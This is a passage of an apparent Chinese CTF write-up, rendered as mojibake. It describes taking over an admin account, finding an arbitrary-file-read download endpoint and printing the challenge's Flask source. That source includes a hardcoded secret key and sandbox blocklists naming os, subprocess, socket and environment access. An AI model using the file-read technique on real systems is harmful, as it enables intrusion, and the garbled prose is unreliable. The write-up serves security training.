1117210622168.png&amp;pos_id=img-A0YJbOft-1767957868072)</p><p>â€‹è¿™é‡Œæˆ‘æ²¡æ”¹ï¼Œè¯æ˜ä¿®æ”¹å¯†ç æˆåŠŸäº†ï¼Œä¹‹åå°±å¯ä»¥å»ç™»å½•äº†ï¼ŒæˆåŠŸè¿›å…¥åå°ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/b5873968dbb14c21a10c349dcd5c9d1e.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¾€ä¸‹é¢ç¿»å‘ç°äº†è¿™é‡Œæœ‰ä¸ªè¶…é“¾æ¥ï¼Œä¼¼ä¹å¯ä»¥ç‚¹ï¼Œç‚¹å‡»ä¹‹åå‘ç°æ˜¯ä¸‹è½½åšå®¢çš„åœ°æ–¹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6751e2c1503f470697ba7fbe83c7d605.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æŠ“åŒ…ä¹‹åå‘ç°äº†æ–‡ä»¶ä¸‹è½½æ¥å£ï¼Œä¼¼ä¹å¯ä»¥ä»»æ„æ–‡ä»¶è¯»ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/e5a07ef7ba6546d29923caaef1d693fa.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¯•ç€è¯»å–æ ¹ç›®å½•ä¸‹çš„ flag æ–‡ä»¶å¤±è´¥äº†ï¼Œè¢« forbidden äº†ï¼Œä¸è¿‡å¯ä»¥è¯»å–æºç ï¼Œç›´æ¥ä¸‹è½½ app.py å¾—åˆ°æºç ï¼Œæºç é‡Œæœ‰ç”¨çš„åœ°æ–¹åœ¨è¿™å„¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template, session, redirect, url_for, flash,send_file, abort</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;super_secret_key_for_session_2025&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;password_md5&#x27;</span>: hashlib.md5(<span class="string">&#x27;KAlsidhKUHLKjhdskfhkajHSKDJH&#x27;</span>.encode()).hexdigest(),</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;admin@example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;id_card&#x27;</span>: <span class="string">&#x27;110101199003072316&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phone&#x27;</span>: <span class="string">&#x27;13800138000&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SandboxSecurityException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Non-ASCII characters are not allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    dangerous_keywords = [  <span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;hasattr&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;quit&quot;</span>, <span class="string">&quot;vars&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;locals&quot;</span>, <span class="string">&quot;delattr&quot;</span>, <span class="string">&quot;help&quot;</span>, <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;requests&quot;</span>, <span class="string">&quot;socket&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;urllib&quot;</span>, <span class="string">&quot;ctypes&quot;</span>, <span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&quot;input&quot;</span>, <span class="string">&quot;codecs&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__getattribute__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__bases__&quot;</span>, <span class="string">&quot;__mro__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__init__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__name__&quot;</span>, <span class="string">&quot;__dict__&quot;</span>, <span class="string">&quot;__code__&quot;</span>, <span class="string">&quot;__closure__&quot;</span>, <span class="string">&quot;__defaults__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;subclasses&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="string">&quot;loads&quot;</span>, <span class="string">&quot;dump&quot;</span>, <span class="string">&quot;dumps&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;spawn&quot;</span>, <span class="string">&quot;fork&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;remove&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;listdir&quot;</span>, <span class="string">&quot;environ&quot;</span>, <span class="string">&quot;getenv&quot;</span>, <span class="string">&quot;putenv&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;read&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;flush&quot;</span>, <span class="string">&quot;seek&quot;</span>, <span class="string">&quot;tell&quot;</span>, <span class="string">&quot;truncate&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;connect&quot;</span>, <span class="string">&quot;bind&quot;</span>, <span class="string">&quot;listen&quot;</span>, <span class="string">&quot;accept&quot;</span>, <span class="string">&quot;send&quot;</span>, <span class="string">&quot;recv&quot;</span>, <span class="string">&quot;gethostname&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;gethostbyname&quot;</span>, <span class="string">&quot;getaddrinfo&quot;</span>, <span class="string">&quot;urlopen&quot;</span>, <span class="string">&quot;urlretrieve&quot;</span>, <span class="string">&quot;Request&quot;</span>,]</span><br><span class="line">    <span class="keyword">for</span> kw <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">        <span class="keyword">if</span> kw <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Disallowed keyword: <span class="subst">&#123;kw&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code_obj</span>):</span><br><span class="line">    opcode_io = StringIO()</span><br><span class="line">    dis(code_obj, file=opcode_io)</span><br><span class="line">    opcodes = opcode_io.getvalue().splitlines()</span><br><span class="line">    opcode_io.close()</span><br><span class="line"></span><br><span class="line">    allowed_globals = &#123;<span class="string">&quot;print&quot;</span>, <span class="string">&quot;len&quot;</span>, <span class="string">&quot;str&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;float&quot;</span>, <span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;seed&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;LOAD_GLOBAL&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">4</span> <span class="keyword">and</span> parts[<span class="number">3</span>].startswith(<span class="string">&#x27;(&#x27;</span>) <span class="keyword">and</span> parts[<span class="number">3</span>].endswith(<span class="string">&#x27;)&#x27;</span>):</span><br><span class="line">                name = parts[<span class="number">3</span>][<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> allowed_globals:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Disallowed global access: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;IMPORT_NAME&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Import statements are not allowed&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;LOAD_METHOD&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    dangerous_events = &#123;</span><br><span class="line">        <span class="string">&quot;os.system&quot;</span>, <span class="string">&quot;os.popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.call&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.check_output&quot;</span>, <span class="string">&quot;subprocess.run&quot;</span>, <span class="string">&quot;subprocess.getoutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;builtins.eval&quot;</span>, <span class="string">&quot;builtins.compile&quot;</span>, <span class="string">&quot;builtins.__import__&quot;</span>, <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;import&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;importlib.import_module&quot;</span>,</span><br><span class="line">        <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os.open&quot;</span>, <span class="string">&quot;os.read&quot;</span>, <span class="string">&quot;os.write&quot;</span>,</span><br><span class="line">        <span class="string">&quot;urllib.request.urlopen&quot;</span>, <span class="string">&quot;urllib.request.Request&quot;</span>, <span class="string">&quot;requests.&quot;</span>, <span class="string">&quot;socket.socket&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http.client.HTTPConnection&quot;</span>, <span class="string">&quot;http.client.HTTPSConnection&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ctypes.&quot;</span>, <span class="string">&quot;marshal.loads&quot;</span>, <span class="string">&quot;os.execv&quot;</span>, <span class="string">&quot;os.execve&quot;</span>, <span class="string">&quot;os.execvp&quot;</span>, <span class="string">&quot;os.execvpe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.environ&quot;</span>, <span class="string">&quot;os.getenv&quot;</span>, <span class="string">&quot;os.getpid&quot;</span>, <span class="string">&quot;os.getuid&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;os.system&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.remove&quot;</span>, <span class="string">&quot;os.unlink&quot;</span>, <span class="string">&quot;os.chmod&quot;</span>, <span class="string">&quot;os.chown&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> dangerous_event <span class="keyword">in</span> dangerous_events:</span><br><span class="line">        <span class="keyword">if</span> event == dangerous_event <span class="keyword">or</span> event.startswith(dangerous_event + <span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_id_card</span>(<span class="params">id_card</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d&#123;17&#125;[\dXx]$&#x27;</span>, id_card))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;^1[3-9]\d&#123;9&#125;$&#x27;</span>, phone))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLOG_DIR = <span class="string">&#x27;blog&#x27;</span></span><br><span class="line">os.makedirs(BLOG_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_blog_posts</span>():</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(BLOG_DIR):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+)ã€(.+)\.html$&#x27;</span>, filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                title = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">                posts.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;num&#x27;</span>: num,</span><br><span class="line">                    <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">                    <span class="string">&#x27;filename&#x27;</span>: filename</span><br><span class="line">                &#125;)</span><br><span class="line">    posts.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;num&#x27;</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> posts</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next_post_number</span>():</span><br><span class="line">    max_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(BLOG_DIR):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+)ã€&#x27;</span>, filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">if</span> num &gt; max_num:</span><br><span class="line">                    max_num = num</span><br><span class="line">    <span class="keyword">return</span> max_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    logged_in = <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session</span><br><span class="line">    posts = get_blog_posts()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, logged_in=logged_in, posts=posts)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            flash(<span class="string">&#x27;è¯·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç &#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pwd_md5 = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line">        user = users.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="string">&#x27;password_md5&#x27;</span>] == pwd_md5:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/admin&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blog/&lt;filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_blog</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ— æ•ˆæ–‡ä»¶&quot;</span>, <span class="number">400</span></span><br><span class="line">    filepath = os.path.join(BLOG_DIR, filename)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ç« ä¸å­˜åœ¨&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    next_num = get_next_post_number()</span><br><span class="line">    posts = get_blog_posts()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], next_num=next_num, posts=posts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/publish&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">publish_blog</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;æœªç™»å½•&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> title <span class="keyword">or</span> <span class="keyword">not</span> content:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;æ ‡é¢˜å’Œå†…å®¹ä¸èƒ½ä¸ºç©º&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    next_num = get_next_post_number()</span><br><span class="line">    safe_title = <span class="string">&quot;&quot;</span>.join(c <span class="keyword">if</span> c.isalnum() <span class="keyword">or</span> c <span class="keyword">in</span> (<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> title)</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;next_num&#125;</span>ã€<span class="subst">&#123;safe_title&#125;</span>.html&quot;</span></span><br><span class="line">    filepath = os.path.join(BLOG_DIR, filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;w&#x27;</span>, encoding=<span 